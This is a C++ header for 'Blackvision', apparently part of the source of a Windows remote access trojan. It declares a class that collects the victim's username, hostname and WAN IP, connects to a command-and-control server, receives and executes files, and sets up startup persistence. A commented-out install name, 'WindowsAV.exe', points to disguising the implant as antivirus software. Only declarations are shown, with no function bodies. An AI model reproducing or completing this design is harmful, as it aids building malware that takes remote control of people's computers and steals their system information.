#ifndef Blackvision_
#define Blackvision_

//#include "pch.h"
//#include <iostream>
//#include <winSock2.>
#include <windows.h>
#include <wininet.h>
#include <lmcons.h>
#include <tchar.h>
#include <string>
#include <cstring>
#include <sstream>
#include <fstream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "winmm.lib")
#define BUFFER 1024
#define INTERVAL 5000
//#define INSTALLNAME "WindowsAV.exe" 


static bool connected = false;
// ZeroMemory < memset
class Blackvision {
public:
	char username[UNLEN + 1];
	char hostname[MAX_COMPUTERNAME_LENGTH + 1];
	TCHAR DIR[MAX_PATH];
	DWORD len = UNLEN + 1;
	DWORD hlen = sizeof(hostname) / sizeof(hostname[0]);
	char wanip[500];
	SOCKET sockfd;
	char recvbuf[BUFFER];
	char* file_commands[5];
	char* msgbox[5];
	char* fcommands[5];
	char* audio[5];
	char* cmd[5];
	char filebuf[BUFFER];
	struct sockaddr_in server;
	void strsplit(char src[500], char* dest[5]);
	void C2Connect();
	void ConnectionManage();
	void respond(const char* data);
	std::string GetSysinfo();
	void Wanip();
	void recvFile();
	void ExecuteFile(char* filename);
	void startup();
	void reconnect();
};



#endif
